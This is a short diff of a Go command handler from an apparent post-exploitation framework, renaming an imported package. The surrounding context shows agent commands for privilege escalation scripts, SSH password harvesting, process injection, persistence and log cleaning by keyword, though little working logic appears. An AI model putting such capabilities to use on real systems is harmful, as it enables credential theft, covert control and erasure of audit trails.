@@ -9,7 +9,7 @@ import (
 	"os"
 	"strconv"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/pflag"
 )
@@ -23,7 +23,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 
 	switch cmdSlice[0] {
 
-	case emp3r0r_data.C2CmdLPE:
+	case emp3r0r_def.C2CmdLPE:
 		// Usage: !lpe --script_name <script_name>
 		// Runs a Local Privilege Escalation (LPE) script.
 		scriptName := flags.StringP("script_name", "s", "", "Script name")
@@ -37,7 +37,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		out = runLPEHelper(*scriptName, *checksum)
 		return
 
-	case emp3r0r_data.C2CmdSSHHarvester:
+	case emp3r0r_def.C2CmdSSHHarvester:
 		// Usage: !ssh_harvester
 		// Starts monitoring SSH connections and logs passwords.
 		passfile := fmt.Sprintf("%s/%s.txt",
@@ -47,7 +47,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !inject --method method --pid pid
-	case emp3r0r_data.C2CmdInject:
+	case emp3r0r_def.C2CmdInject:
 		// Usage: !inject --method <method> --pid <pid>
 		// Injects code into the specified process using the specified method.
 		method := flags.StringP("method", "m", "", "Injection method")
@@ -70,7 +70,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !persistence --method method
-	case emp3r0r_data.C2CmdPersistence:
+	case emp3r0r_def.C2CmdPersistence:
 		// Usage: !persistence --method <method>
 		// Sets up persistence using the specified method.
 		method := flags.StringP("method", "m", "", "Persistence method")
@@ -100,7 +100,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !get_root
-	case emp3r0r_data.C2CmdGetRoot:
+	case emp3r0r_def.C2CmdGetRoot:
 		// Usage: !get_root
 		// Attempts to gain root privileges.
 		if os.Geteuid() == 0 {
@@ -111,7 +111,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !clean_log --keyword keyword
-	case emp3r0r_data.C2CmdCleanLog:
+	case emp3r0r_def.C2CmdCleanLog:
 		// Usage: !clean_log --keyword <keyword>
 		// Cleans logs containing the specified keyword.
 		keyword := flags.StringP("keyword", "k", "", "Keyword to clean logs")
